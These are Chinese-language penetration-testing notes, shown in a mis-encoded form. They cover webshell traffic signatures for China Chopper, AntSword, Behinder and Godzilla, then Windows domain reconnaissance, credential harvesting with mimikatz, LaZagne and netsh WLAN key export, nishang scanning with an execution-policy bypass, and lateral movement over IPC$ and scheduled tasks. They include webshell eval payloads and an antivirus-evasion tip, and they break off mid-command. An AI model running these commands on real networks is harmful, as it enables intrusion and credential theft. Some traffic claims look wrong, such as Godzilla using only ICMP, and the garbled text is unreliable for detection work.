å¸¸è§„æ¸—é€æµ‹è¯• æ¼æ´æ‰«æ(webæ¼æ´æ‰«æã€ç³»ç»Ÿæ¼æ´æ‰«æ) â€“ æ¼æ‰«æŠ¥å‘Š æ‰‹å·¥éªŒè¯(éªŒè¯æ‰«æå™¨æ‰«å‡ºæ¥çš„æ¼æ´ã€æ‰«æå™¨æ‰«æä¸å‡ºæ¥çš„æ¼æ´(owasp top 10ï¼Œé€»è¾‘æ¼æ´å’Œè¶Šæƒæ¼æ´ã€æœªæˆæƒè®¿é—®æ¼æ´)) â€“ æ¸—é€æµ‹è¯•æŠ¥å‘Š æ‰‹å·¥æ¸—é€æµ‹è¯•é˜¶æ®µï¼š 1ã€waf 2ã€sqlmap 3ã€éªŒè¯ã€è·å–æ•°æ® å¤æµ‹ æµ‹è¯•ä¹‹å‰çš„æ¸—é€æµ‹è¯•æŠ¥å‘Šä¸­çš„æ¼æ´æ˜¯å¦å·²ç»ä¿®å¤äº† â€“ å¤æµ‹æŠ¥å‘Š 3-25å†°èèšå‰‘èœåˆ€ç­‰æµé‡ç‰¹å¾åˆ†æå’Œç‰¹å¾ä¿®æ”¹3-25-1 ä¸­å›½èœåˆ€æµé‡åˆ†æèœåˆ€æœ¨é©¬æ˜¯ä¸€ç§è€ç‰Œè¿œæ§æœ¨é©¬,ä½¿ç”¨TCPåè®®ä¸CCæœåŠ¡å™¨é€šä¿¡ æ•°æ®åŒ…æµé‡ç‰¹å¾ï¼š 1ï¼Œè¯·æ±‚åŒ…ä¸­ï¼šuaå¤´ä¸ºç™¾åº¦ï¼Œç«ç‹ 2ï¼Œè¯·æ±‚ä½“ä¸­å­˜åœ¨eavlï¼Œbase64ç­‰ç‰¹å¾å­—ç¬¦ 3ï¼Œè¯·æ±‚ä½“ä¸­ä¼ é€’çš„payloadä¸ºbase64ç¼–ç ï¼Œå¹¶ä¸”å­˜åœ¨å›ºå®šçš„ 4. è¿æ¥æœåŠ¡å™¨çš„IPåœ°å€å¾€å¾€é‡‡ç”¨åŠ¨æ€DNSè½¬æ¢,è¾ƒéš¾é€šè¿‡IPç›´æ¥æ£€æµ‹ 5. è¿æ¥ç«¯å£ä¸å›ºå®š,éœ€è¦æ‰«ææ£€æµ‹ã€‚ä¸€èˆ¬æ‰«æ20000-30000ç«¯å£èŒƒå›´å¯ä»¥æ£€æµ‹å‡ºèœåˆ€æ´»åŠ¨ 6. è¿æ¥å»ºç«‹åå‘é€â€knifeâ€æˆ–â€dadanâ€ç­‰éªŒè¯ç è¿›è¡ŒéªŒè¯,å¯ä»¥é€šè¿‡æ£€æµ‹è¿™äº›å…³é”®è¯å®ç°æ£€æµ‹ payloadç‰¹å¾ï¼š PHP: ASP: %eval request(â€œcaidaoâ€)% ASP.NET: %@ Page Languageâ€œJscriptâ€%%eval(Request.Item[â€œcaidaoâ€],â€œunsafeâ€);% 3-25-2 èš‚èšå®å‰‘æµé‡åˆ†ææ•°æ®åŒ…æµé‡ç‰¹å¾ï¼š ä¸€èˆ¬çš„ä¸€å¥è¯æœ¨é©¬éƒ½å­˜åœ¨ä¸€ä¸‹ç‰¹å¾ï¼š 1.æ¯ä¸ªè¯·æ±‚ä½“éƒ½å­˜åœ¨@ini_set(â€œdisplay_errorsâ€, â€œ0â€);@set_time_limit(0)å¼€å¤´ã€‚å¹¶ä¸”åé¢å­˜åœ¨base64ç­‰å­—ç¬¦ 2.å“åº”åŒ…çš„ç»“æœè¿”å›æ ¼å¼ä¸ºï¼šéšæœºæ•°â€”-å“åº”å†…å®¹â€”éšæœºæ•° 3.è¿æ¥æœåŠ¡å™¨IPåœ°å€ä¹Ÿå¸¸é‡‡ç”¨åŠ¨æ€DNS,é€šè¿‡IPåœ°å€æ£€æµ‹éš¾åº¦å¤§ 4.è¿æ¥ç«¯å£å¸¸ä½¿ç”¨443æˆ–8080ç­‰å¸¸ç”¨ç«¯å£,ç¨éš¾æ£€æµ‹ 5.è¿æ¥æ—¶å‘é€å­—ç¬¦ä¸²â€yyoaâ€è¿›è¡ŒéªŒè¯,è¿™æ˜¯å®ƒçš„ç‰¹å¾æ ‡å¿—,å¯ä»¥é€šè¿‡æ£€æµ‹è¿™ä¸ªå…³é”®è¯å®ç°æ£€æµ‹ payloadç‰¹å¾ï¼š Phpä¸­ä½¿ç”¨assertï¼Œevalæ‰§è¡Œ, asp ä½¿ç”¨eval åœ¨jspä½¿ç”¨çš„æ˜¯Javaç±»åŠ è½½ï¼ˆClassLoaderï¼‰,åŒæ—¶ä¼šå¸¦æœ‰base64ç¼–ç è§£ç ç­‰å­—ç¬¦ç‰¹å¾ 3-25-3 å†°èæµé‡åˆ†æ## ä½¿ç”¨çš„UDPç«¯å£å¸¸ä¸º53ã€123ã€161ã€162ç­‰,è¿™äº›ç«¯å£è¾ƒéš¾å¼•èµ·æ³¨æ„ ## æ•°æ®åŒ…çš„é•¿åº¦ä¸€èˆ¬åœ¨120-140å­—èŠ‚å·¦å³,å¯ä»¥ä½œä¸ºåˆ¤æ–­æ ‡å‡†ã€‚ ## æ•°æ®åŒ…çš„å†…å®¹ä»¥0x01å¼€å¤´,ä»¥0x00ç»“å°¾,ä¸­é—´å«æœ‰èå­åè®®ç‰¹å¾æ•°æ®,è¿™æ˜¯æ£€æµ‹çš„é‡è¦æ ‡å¿—ã€‚ å†°è2.0æµé‡ç‰¹å¾ï¼š ## ç¬¬ä¸€é˜¶æ®µè¯·æ±‚ä¸­è¿”å›åŒ…çŠ¶æ€ç ä¸º200ï¼Œè¿”å›å†…å®¹å¿…å®šæ˜¯16ä½çš„å¯†é’¥ ## è¯·æ±‚åŒ…å­˜åœ¨ï¼šAccept: texthtml, imagegif, imagejpeg, ; q.2, ; q.2 ## å»ºç«‹è¿æ¥åçš„cookieå­˜åœ¨ç‰¹å¾å­—ç¬¦ ## æ‰€æœ‰è¯·æ±‚ Cookieçš„æ ¼å¼éƒ½ä¸º: Cookie: PHPSESSID; pathï¼› ## å†°è3.0æµé‡ç‰¹å¾ï¼š ## è¯·æ±‚åŒ…ä¸­content-length ä¸º5740æˆ–5720ï¼ˆå¯èƒ½ä¼šæ ¹æ®Javaç‰ˆæœ¬è€Œæ”¹å˜ï¼‰ ## æ¯ä¸€ä¸ªè¯·æ±‚å¤´ä¸­å­˜åœ¨ Pragma: no-cacheï¼ŒCache-Control: no-cache Accept: texthtml,applicationxhtml+xml,applicationxml;q0.9,imagewebp,imageapng,*;q0.8,applicationsigned-exchange;vb3;q0.9 paylaodåˆ†æï¼š phpåœ¨ä»£ç ä¸­åŒæ ·ä¼šå­˜åœ¨evalæˆ–assertç­‰å­—ç¬¦ç‰¹å¾ 3-25-4 å“¥æ–¯æ‹‰æµé‡ç‰¹å¾## å“¥æ–¯æ‹‰æµé‡åˆ†æï¼š ## ä½¿ç”¨çš„å…¨æ˜¯ICMPåè®®æ•°æ®æŠ¥æ–‡,è€ŒICMPæµé‡æœ¬èº«å°±ä¸é«˜,æ‰€ä»¥è¾ƒéš¾åœ¨å¤§æµé‡ä¸­æ£€æµ‹ ## ICMPæ•°æ®æŠ¥æ–‡çš„è½½è·éƒ¨åˆ†Lengthå€¼å›ºå®šä¸º92å­—èŠ‚,è¿™æ˜¯å®ƒçš„é‡è¦ç‰¹å¾ ## æ‰€æœ‰è¯·æ±‚ä¸­ Accept: texthtml,applicationxhtml+xml,applicationxml;q0.9,imagewebp,;q0.8 ## æ‰€æœ‰å“åº”ä¸­ Cache-Control: no-store, no-cache, must-revalidate, ## ä½¿ç”¨çš„å…¨æ˜¯ICMPåè®®æ•°æ®æŠ¥æ–‡,è€ŒICMPæµé‡æœ¬èº«å°±ä¸é«˜,æ‰€ä»¥è¾ƒéš¾åœ¨å¤§æµé‡ä¸­æ£€æµ‹ã€‚ # ICMPæ•°æ®æŠ¥æ–‡çš„è½½è·éƒ¨åˆ†Lengthå€¼å›ºå®šä¸º92å­—èŠ‚,è¿™æ˜¯å®ƒçš„é‡è¦ç‰¹å¾ã€‚ payloadç‰¹å¾ï¼š jspä¼šå‡ºç°xc,passå­—ç¬¦å’ŒJavaåå°„ï¼ˆClassLoaderï¼ŒgetClass().getClassLoader()ï¼‰ï¼Œbase64åŠ è§£ç ç­‰ç‰¹å¾ phpï¼Œaspåˆ™ä¸ºæ™®é€šçš„ä¸€å¥è¯æœ¨é©¬ æ•°æ®æŠ¥æ–‡çš„payloadå†…å®¹ä»¥â€godzillaâ€å¼€å¤´,è¿™ä¹Ÿæ˜¯æ£€æµ‹çš„ç‰¹å¾æ ‡å¿— 3-26 åŸŸ1-1 ä¿¡æ¯æ”¶é›†ç‰ˆæœ¬ã€è¡¥ä¸ã€æœåŠ¡ã€ä»»åŠ¡ã€é˜²æŠ¤ç­‰ æ—¨åœ¨äº†è§£å½“å‰æœåŠ¡å™¨çš„è®¡ç®—æœºåŸºæœ¬ä¿¡æ¯ï¼Œä¸ºåç»­åˆ¤æ–­æœåŠ¡å™¨è§’è‰²ã€ç½‘ç»œç¯å¢ƒç­‰åšå‡†å¤‡ã€‚ systeminfo ## è¯¦ç»†ä¿¡æ¯ net start ## å·²ç»å¼€å¯äº†å“ªäº›æœåŠ¡ï¼Œé€šè¿‡å¼€å¯çš„æœåŠ¡å¯èƒ½ä¹Ÿèƒ½åˆ¤æ–­å‡ºè¿™å°ä¸»æœºæ‰€å¤„çš„è§’è‰²ï¼Œæ¯”å¦‚mysqlæ•°æ®åº“å®‰è£…ä¹‹åå°±ä¼šæœ‰ä¸€ä¸ªmysqldæœåŠ¡ tasklist ## è¿›ç¨‹åˆ—è¡¨ schtasks ## è®¡åˆ’ä»»åŠ¡ï¼Œæƒé™ä¸å¤Ÿçš„è¯ï¼Œå¯èƒ½ç»“æœæ²¡åŠæ³•åŠ è½½å‡ºæ¥ï¼Œå³ä¾¿æ˜¯ç®¡ç†å‘˜ï¼Œä¹Ÿå¯èƒ½ç”±äºåŸŸæ§ç­–ç•¥å½±å“è€ŒæŸ¥çœ‹ä¸åˆ° 1-2 ç½‘ç»œä¿¡æ¯å¼€æ”¾ç«¯å£ã€ç½‘ç»œç¯å¢ƒã€å‡ºå£ä»£ç†ç­‰ ipconfig all ## åˆ¤æ–­å­˜åœ¨åŸŸï¼Œçœ‹DNSåç¼€ net view domain ## æŸ¥çœ‹æ˜¯å¦å­˜åœ¨åŸŸ net time domain ## åˆ¤æ–­ä¸»åŸŸï¼Œä¹Ÿå°±æ˜¯åŸŸæ§ä¸»æœº netstat -ano ## å½“å‰ä¸»æœºçš„ç«¯å£å¼€æ”¾æƒ…å†µï¼Œé€šè¿‡å¼€æ”¾æƒ…å†µæ¥å¤§è‡´åˆ¤æ–­ä¸€ä¸‹å®ƒåœ¨ç½‘ç»œä¸­çš„è§’è‰²ã€‚æ¯”å¦‚mysqlçš„å¼€æ”¾äº†3306ç«¯å£ nslookup ## åŸŸå è¿½è¸ªæ¥æºåœ°å€ åŸŸä¹Ÿå¯ä»¥æœ‰å¥½å¤šå±‚çº§ god.org ## ä¸»åŸŸå webserver.god.org ## ä¸€å±‚åŸŸä¸»æœºä¸­çš„åŸŸå jaden.webserver.god.org ## ä¸¤å±‚åŸŸä¸»æœºä¸­çš„åŸŸå ## ç”±äºåŸŸä¸­çš„ä¸»æœºä¸€èˆ¬éƒ½æ˜¯è¦å’ŒåŸŸæ§ä¸»æœºè¿›è¡Œæ—¶é—´åŒæ­¥çš„ï¼Œæ‰€ä»¥é€šè¿‡net time domainæ¥æ‰¾åˆ°åŸŸæ§ä¸»æœºï¼šæ˜¾ç¤ºçš„ã€ \\OWA2010CN-God.god.org å°±æ˜¯åŸŸæ§ä¸»æœºçš„æ•´ä½“åŸŸåï¼Œå…¶ä¸­ \\OWA2010CN-God æ˜¯åŸŸæ§çš„ä¸»æœºåã€‚ ping slookup å¦‚ä½•å®šä½åŸŸæ§ä¸»æœºå‘¢ï¼Œå¯ä»¥é€šè¿‡pingæˆ–è€…nslookupæŸ¥çœ‹DNSè§£æè®°å½•çš„æ–¹å¼æ¥æ‰¾åŸŸæ§ä¸»æœºçš„çœŸå®ip 1-3 ç”¨æˆ·ä¿¡æ¯åŸŸç”¨æˆ·ã€æœ¬åœ°ç”¨æˆ·ã€ç”¨æˆ·æƒé™ã€å¯¹åº”ç»„ä¿¡æ¯ç­‰ ## è·å–è®¡ç®—æœºæˆ–è€…åŸŸç¯å¢ƒä¸‹çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„ä¿¡æ¯ï¼Œä¾¿äºåç»­åˆ©ç”¨å‡­æ®æ¥è¿›è¡Œæµ‹è¯• ## åŸŸç¯å¢ƒä¸­å¸¸è§çš„ç”¨æˆ·èº«ä»½ä¿¡æ¯æŸ¥çœ‹ï¼š Domain Admins: ## åŸŸç®¡ç†å‘˜ï¼Œé»˜è®¤å¯¹åŸŸæ§åˆ¶å™¨æœ‰å®Œå…¨æ§åˆ¶æƒ Domain Computers: ## æŸ¥çœ‹åŸŸå†…åé‚£äº›ä¸»æœº Domain Controllers: ## æŸ¥çœ‹åŸŸæ§ä¸»æœºæœ‰å“ªäº› Domain Guestï¼š ## åŸŸè®¿å®¢ï¼Œæƒé™ä½ Domain Users: ## æ™®é€šåŸŸç”¨æˆ· Enterprise Admins: ## ä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç”¨æˆ·ï¼Œé»˜è®¤å¯¹åŸŸæ§åˆ¶å™¨æœ‰å®Œå…¨æ§åˆ¶æƒ ## ç”¨æˆ·ä¿¡æ¯æ”¶é›† whoami all ï¼š## ç”¨æˆ·æƒé™ net config workstation : ## ç™»å½•ä¿¡æ¯ net user : ## æœ¬åœ°ç”¨æˆ· net localgroup : ## æœ¬åœ°ç”¨æˆ·ç»„ net user domain : ## è·å–åŸŸç”¨æˆ·ä¿¡æ¯ net group domain :## è·å–åŸŸç”¨æˆ·ç»„ä¿¡æ¯ wmic useraccount get all : ## æ¶‰åŠåŸŸç”¨æˆ·è¯¦ç»†ä¿¡æ¯ net group â€œDomain Adminsâ€ domain : ## æŸ¥è¯¢åŸŸç®¡ç†å‘˜è´¦æˆ· net group â€œEnterprise Adminsâ€ domain : ## æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„ net group â€œDomain Controllersâ€ domain : ## æŸ¥è¯¢åŸŸæ§åˆ¶å™¨ 1-4 å‡­æ®ä¿¡æ¯æ˜æ–‡ã€hashã€å„ç§å£ä»¤ç­‰ï¼Œéå¸¸é‡è¦çš„ä¸€ç¯ ## å‡­æ®ä¿¡æ¯æ”¶é›†æ“ä½œæ¼”ç¤ºï¼Œä¸»è¦æ˜¯ä¸ºäº†æ”¶é›†å„ç§å¯†æ–‡ã€æ˜æ–‡ã€å£ä»¤ç­‰ï¼Œä¸ºåç»­æ¨ªå‘æ¸—é€åšå¥½å‡†å¤‡ ## è®¡ç®—æœºç”¨æˆ·HASHå¯†ç ã€æ˜æ–‡å¯†ç ç­‰è·å– â€“ mimikatz(win)ï¼Œmimipenguin(linux)ä¸å¤ªå¥½ç”¨ï¼Œå†æ‰¾æ‰¾å…¶ä»–å·¥å…· ## è®¡ç®—æœºå„ç§åè®®æœåŠ¡å£ä»¤è·å–-LaZagne(all)ï¼ŒXenArmor(win)ï¼Œå†æ‰¾æ‰¾å…¶ä»–å·¥å…· Netsh WLAN show profiles Netsh WLAN show profiles nameâ€æ— çº¿åç§°â€ keyclear 1. ç«™ç‚¹æºç å¤‡ä»½æ–‡ä»¶ã€æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ç­‰ 2. å„ç±»æ•°æ®åº“Webç®¡ç†å…¥å£ï¼Œå¦‚PhpMyAdmin 3. æµè§ˆå™¨ä¿å­˜å¯†ç ã€æµè§ˆå™¨Cookie 4. å…¶ä»–ç”¨æˆ·ä¼šè¯ã€3389å’Œipc$ è¿æ¥è®°å½•ã€å›æ”¶ç«™å†…å®¹ 5.Windowsä¿å­˜çš„WIFIå¯†ç  6. ç½‘ç»œå†…éƒ¨çš„å„ç§è´¦å·å’Œå¯†ç ï¼Œå¦‚ï¼šEmailã€VPNã€FTPã€OAç­‰ 1-5 mimikatzhttps://blog.csdn.net/weixin_40412037articledetails113348310 ä¸‹è½½çš„æ—¶å€™ï¼Œæ³¨æ„ï¼Œç³»ç»Ÿå¦‚æœå¼€å¯äº†æ€æ¯’è½¯ä»¶ï¼Œä¼šè¢«æ€æ‰çš„ï¼Œæ‰€ä»¥å¯ä»¥å…ˆå°†ä¸‹è½½ç›®å½•è®¾ç½®ä¸ºå…æ€çš„ã€‚ mimikatzéœ€è¦ç®¡ç†å‘˜æƒé™æ‰èƒ½è¿è¡Œï¼Œæ‰€ä»¥æƒ³åŠæ³•å…ˆææƒã€‚ privilege::debug æ¯”å¦‚ï¼Œå…ˆç™»å½•æœ¬åœ°ç®¡ç†å‘˜ï¼Œæ¥æ‰§è¡Œ æ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤ 1-6 mimipenguinwindowsä¸Šç”¨mimikatzï¼Œlinuxä¸‹å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ª ä½†æ˜¯è¿™ä¸ªæ²¡æœ‰mimikatzé‚£ä¹ˆå¼ºå¤§ï¼Œä¸‹é¢æ˜¯è¿™ä¸ªå·¥å…·æ”¯æŒçš„ç³»ç»Ÿç‰ˆæœ¬ã€‚ çœ‹æ ·å­ä¸»è¦æ˜¯æ”¯æŒubuntuçš„ã€‚ 1-7 å„ç§åè®®è·å–å£ä»¤1-7-1 LaZagneå¯ä»¥é€šè¿‡ä¸‹é¢ä¸¤ä¸ªå·¥å…·æ¥è·å– è¿™ä¸ªå·¥å…·è¯´è‡ªå·±èƒ½å¤Ÿè·å–å„ç±»å¯†ç ï¼Œä½†å®é™…ä¸Šæ¯”è¾ƒèœï¼Œå¹¶ä¸èƒ½è·å–æ‰€æœ‰ç§ç±»çš„å¯†ç ï¼Œä½†æ˜¯å¼€æºå…è´¹ï¼Œæ”¯æŒå„ç±»ç³»ç»Ÿã€‚ 1-7-2 XenArmor å¯†ç éƒ½è·å–åˆ°äº†ï¼Œæ‹¿åˆ°äº†è¿™äº›å¯†ç ï¼Œå°±å¯ä»¥é€šè¿‡è¿™äº›å¯†ç å»å°è¯•ç™»å½•å†…ç½‘ä¸­çš„å…¶ä»–ä¸»æœºï¼Œå¯èƒ½å°±èƒ½ç›´æ¥ç™»å½•ä¸Šï¼Œç„¶åå†é‡å¤æ‰§è¡Œè¿™æ ·çš„åŠ¨ä½œã€‚ 1-8 åç»­æ¢é’ˆ(ä¿¡æ¯æ”¶é›†)å­˜æ´»ä¸»æœºã€åŸŸæ§åˆ¶å™¨ã€ç½‘ç»œæ¶æ„ã€æœåŠ¡ç«¯å£ç­‰ ## æ¢æµ‹ä¸»æœºåŸŸæ§æ¶æ„æœåŠ¡æ“ä½œæ¼”ç¤º ## ä¸ºåç»­æ¨ªå‘æ¸—é€çš„æ€è·¯åšå‡†å¤‡ï¼Œé’ˆå¯¹åº”ç”¨ï¼Œåè®®ç­‰å„ç±»æ”»å‡»æ‰‹æ³• ## æ¢é’ˆåŸŸæ§åˆ¶å™¨åå’Œåœ°å€ä¿¡æ¯ç­‰ net time domain nslookup ping ## æ¢é’ˆåŸŸå†…å­˜æ´»ä¸»æœºåŠåœ°å€ä¿¡æ¯ nbtscan 192.168.3.024 ç¬¬ä¸‰æ–¹å·¥å…· for L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr â€œTTLâ€ è‡ªå¸¦ ## å†…éƒ¨æŒ‡ä»¤ nmap masscan ## ç¬¬ä¸‰æ–¹PowerShellè„šæœ¬ nishangã€empireç­‰ #å¯¼å…¥æ¨¡å— nishang https://xw.qq.com/cmsid/20220420A000FO00 Import-Module . ishang.psm1 #è®¾ç½®æ‰§è¡Œç­–ç•¥ Set-ExecutionPolicy RemoteSigned #è·å–æ¨¡å—nishangçš„å‘½ä»¤å‡½æ•° Get-Command -Module nishang #è·å–å¸¸è§„è®¡ç®—æœºä¿¡æ¯ Get-Information #ç«¯å£æ‰«æ(æŸ¥çœ‹ç›®å½•å¯¹åº”æ–‡ä»¶æœ‰æ¼”ç¤ºè¯­æ³•ã€å…¶ä»–åŒç†) Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort # å…¶ä»–åŠŸèƒ½ï¼Œåˆ é™¤è¡¥ä¸ã€åå¼¹shellã€å‡­æ®è·å– æ¢é’ˆåŸŸå†…ä¸»æœºè§’è‰²å’ŒæœåŠ¡ä¿¡æ¯ 1-8-1 nbtscannbtscanè¿™ä¸ªå·¥å…·æ˜¯ä¸ªè€ç‰Œå·¥å…·ï¼ŒåŠŸèƒ½ä¹Ÿä¸å¼ºï¼Œè€Œä¸”ä¹Ÿä¸å…æ€ï¼Œæ‰€ä»¥å¤§å®¶çŸ¥é“ä¸€ä¸‹å³å¯ã€‚å®ƒåŸºäºçš„æ˜¯Netbiosåè®®æ¥è¿›è¡Œä¸»æœºå‘ç°çš„ã€‚å·¥å…·éœ€è¦ä¸‹è½½æ¥ä½¿ç”¨ã€‚ 1-8-2 ç³»ç»Ÿè‡ªå¸¦æŒ‡ä»¤æ¢æµ‹for L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.241.%I | findstr â€œTTLâ€ #è‡ªå¸¦å†…éƒ¨æŒ‡ä»¤ 1-8-3 nmapå’Œmasscannmapå’Œmasscanå±äºç¬¬ä¸‰æ–¹å·¥å…·ï¼Œå¦‚æœå¯¹æ–¹å¼€å¯äº†è“é˜Ÿçš„ä¸€äº›é˜²æŠ¤æˆ–è€…ç›‘æµ‹å·¥å…·ï¼Œé‚£ä¹ˆå¾ˆå®¹æ˜“è¢«ç›‘æ§åˆ°ï¼ŒPowershellè„šæœ¬å°±ä¸ä¼šè¢«å‘ç°ï¼Œå› ä¸ºå®ƒä½¿ç”¨çš„æ˜¯windowsè‡ªå¸¦çš„powershellæ¡†æ¶æ¥å†™çš„è„šæœ¬ï¼Œæœ‰åˆ«äººå†™å¥½çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ‹¿æ¥ç”¨ï¼Œæ¯”å¦‚nishangå’Œempireï¼Œä¸ªäººæ„Ÿè§‰nishangæ¯”empireå¥½ä¸€äº›ã€‚ 1-8-4 nishanghttps://github.com/samratashok/nishang é¦–å…ˆæ‰“å¼€powershellï¼Œpowershellå…¶å®å°±æ˜¯windowsè‡ªå¸¦çš„è„šæœ¬ç¨‹åºå¼€å‘ç¯å¢ƒï¼Œå¯ä»¥é€šè¿‡powershellè¯­è¨€è¿›è¡Œå¼€å‘ï¼Œå’ŒcmdæŒ‡ä»¤å·®ä¸å¤šçš„è¯­è¨€ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç¼–å†™powershellè„šæœ¬æ¥å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ”»å‡» å°†powershellåˆ‡æ¢åˆ°æˆ‘ä»¬çš„nishangç›®å½•ä¸‹ https://xw.qq.com/cmsid/20220420A000FO00 #è®¾ç½®æ‰§è¡Œç­–ç•¥ï¼Œè¾“å…¥å‘½ä»¤ Set-ExecutionPolicy RemoteSignedï¼Œæœ‰é€‰é¡¹æç¤ºé€‰æ‹©Yå°±è¡Œã€‚ RemoteSignedâ€”â€”è¿è¡Œæœ¬åœ°çš„scriptä¸éœ€è¦æ•°å­—ç­¾åï¼Œä½†æ˜¯è¿è¡Œä»ç½‘ç»œä¸Šä¸‹è½½çš„scriptå°±å¿…é¡»è¦æœ‰æ•°å­—ç­¾å Set-ExecutionPolicy RemoteSigned set-executionpolicy Bypass #å¯¼å…¥æ¨¡å— nishang Import-Module . ishang.psm1 #è·å–æ¨¡å—nishangçš„å‘½ä»¤å‡½æ•° Get-Command -Module nishang #è·å–å¸¸è§„è®¡ç®—æœºä¿¡æ¯ Get-Information #ç«¯å£æ‰«æ(æŸ¥çœ‹ç›®å½•å¯¹åº”æ–‡ä»¶æœ‰æ¼”ç¤ºè¯­æ³•ã€å…¶ä»–åŒç†) Invoke-PortScan -StartAddress 192.168.241.0 -EndAddress 192.168.241.100 - ResolveHost -ScanPort # å…¶ä»–åŠŸèƒ½ï¼Œåˆ é™¤è¡¥ä¸ã€åå¼¹shellã€å‡­æ®è·å– å¯¼å…¥æ¨¡å—ï¼Œç”±äºæˆ‘ä»¬ä½¿ç”¨çš„ç‰ˆæœ¬æ¯”è¾ƒé«˜ï¼Œæˆ‘ä»¬çš„ç”µè„‘çš„ä¾èµ–ç¯å¢ƒç‰ˆæœ¬æ¯”è¾ƒä½ï¼Œå¯¼è‡´ä¼šæŠ¥é”™ï¼Œæ²¡å…³ç³»ï¼Œå¿½ç•¥æŠ¥é”™ï¼Œæˆ–è€…å‡çº§ä¸€ä¸‹ä¾èµ–ï¼Œè¿™ä¸ªåœ¨nishangçš„æ–‡æ¡£ä¸­æœ‰å†™åˆ°ï¼Œæˆ–è€…ç™¾åº¦ä¸€ä¸‹ã€‚å¦‚æœæŠ¥é”™äº†ï¼Œé‚£ä¹ˆå†æ¬¡å¯¼å…¥æ¨¡å—ã€‚ è·å–æ¨¡å—nishangçš„å‘½ä»¤å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æä¾›äº†å“ªäº›åŠŸèƒ½ è·å–è®¡ç®—æœºå¸¸è§„ä¿¡æ¯ Get-Information æ¢æµ‹å­˜æ´»ä¸»æœºå’Œå¼€æ”¾çš„ç«¯å£ï¼Œè¿™æœŸé—´ç”±äºæˆ‘çš„è™šæ‹Ÿæœºä¸å¤ªç¨³å®šï¼Œæ‰€ä»¥powshellç»å¸¸åœæ­¢å·¥ä½œï¼Œå¤šè¯•å‡ æ¬¡å°±çœ‹åˆ°æ•ˆæœäº†ã€‚ å¤§å…¬å¸ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ¢æµ‹çš„ä¿¡æ¯æœ‰: æ¢é’ˆåŸŸå†…ä¸»æœºè§’è‰²åŠæœåŠ¡ä¿¡æ¯ åˆ©ç”¨å¼€æ”¾ç«¯å£æœåŠ¡åŠè®¡ç®—æœºååˆ¤æ–­ æ ¸å¿ƒä¸šåŠ¡æœºå™¨ 1. é«˜çº§ç®¡ç†äººå‘˜ã€ç³»ç»Ÿç®¡ç†å‘˜ã€è´¢åŠ¡äººäº‹ä¸šåŠ¡äººå‘˜çš„ä¸ªäººè®¡ç®—æœº 2. äº§å“ç®¡ç†ç³»ç»ŸæœåŠ¡å™¨ 3. åŠå…¬ç³»ç»ŸæœåŠ¡å™¨ 4. è´¢åŠ¡åº”ç”¨ç³»ç»ŸæœåŠ¡å™¨ 5. æ ¸å¿ƒäº§å“æºç æœåŠ¡å™¨(è‡ªå»ºSVNã€GITç­‰) 6. æ•°æ®åº“æœåŠ¡å™¨ 7. æ–‡ä»¶æˆ–è€…ç½‘ç›˜æœåŠ¡å™¨ã€å…±äº«æœåŠ¡å™¨ 8. ç”µå­é‚®ä»¶æœåŠ¡å™¨ 9. ç½‘ç»œç›‘æ§ç³»ç»ŸæœåŠ¡å™¨ 10. å…¶ä»–æœåŠ¡å™¨(å†…éƒ¨æŠ€æœ¯æ–‡æ¡£æœåŠ¡å™¨ã€å…¶ä»–ç›‘æ§æœåŠ¡å™¨ç­‰) è¿˜å¯ä»¥é€šè¿‡nishangæ¥è°ƒç”¨mimikatzï¼Œå®ƒé›†æˆäº†mimikatzçš„åŠŸèƒ½ã€‚ 1-9 åŸŸæ¸—é€ä¹‹ä¼ é€’æ”»å‡»1-9-1 å£ä»¤ä¼ é€’# æ¡ˆä¾‹1-æ¨ªå‘æ¸—é€æ˜æ–‡ä¼ é€’adschtasks ## åœ¨æ‹¿ä¸‹ä¸€å°å†…ç½‘ä¸»æœºåï¼Œé€šè¿‡æœ¬åœ°ä¿¡æ¯æœé›†æ”¶é›†ç”¨æˆ·å‡­è¯ç­‰ä¿¡æ¯åï¼Œå¦‚ä½•æ¨ªå‘æ¸—é€æ‹¿ä¸‹æ›´å¤šçš„ä¸»æœºï¼Ÿè¿™é‡Œä»…ä»‹ç»atschtaskså‘½ä»¤çš„ä½¿ç”¨ï¼Œåœ¨å·²çŸ¥ç›®æ ‡ç³»ç»Ÿçš„ç”¨æˆ·æ˜æ–‡å¯†ç çš„åŸºç¡€ä¸Šï¼Œç›´æ¥å¯ä»¥åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ã€‚è·å–åˆ°æŸä¸ä¸»æœºæƒé™-mimikatzå¾—åˆ°å¯†ç (æ˜æ–‡ã€hash) -ç”¨åˆ°ä¿¡æ¯æ”¶é›†é‡Œé¢åŸŸç”¨æˆ·çš„åˆ—è¡¨å½“ä½œç”¨æˆ·åå­—å…¸-ç”¨åˆ°å¯†ç æ˜æ–‡å½“ä½œå¯†ç å­—å…¸- å°è¯•è¿æ¥-åˆ›å»ºè®¡åˆ’ä»»åŠ¡(at|schtasks) -æ‰§è¡Œæ–‡ä»¶å¯ä¸ºåé—¨æˆ–è€… ç›¸å…³å‘½ä»¤ åˆ©ç”¨æµç¨‹ 1. å»ºç«‹IPCé“¾æ¥åˆ°ç›®æ ‡ä¸»æœº 2. æ‹·è´è¦æ‰§è¡Œçš„å‘½ä»¤è„šæœ¬åˆ°ç›®æ ‡ä¸»æœº 3. æŸ¥çœ‹ç›®æ ‡æ—¶é—´ï¼Œåˆ›å»ºè®¡åˆ’ä»»åŠ¡(atã€schtasks)ï¼Œå®šæ—¶æ‰§è¡Œæ‹·è´åˆ°çš„è„šæœ¬ 4. åˆ é™¤IPCé“¾æ¥ net use \\server\\ipc$ â€œpasswordâ€ user:username #å·¥ä½œç»„ net use \\server\\ipc$ 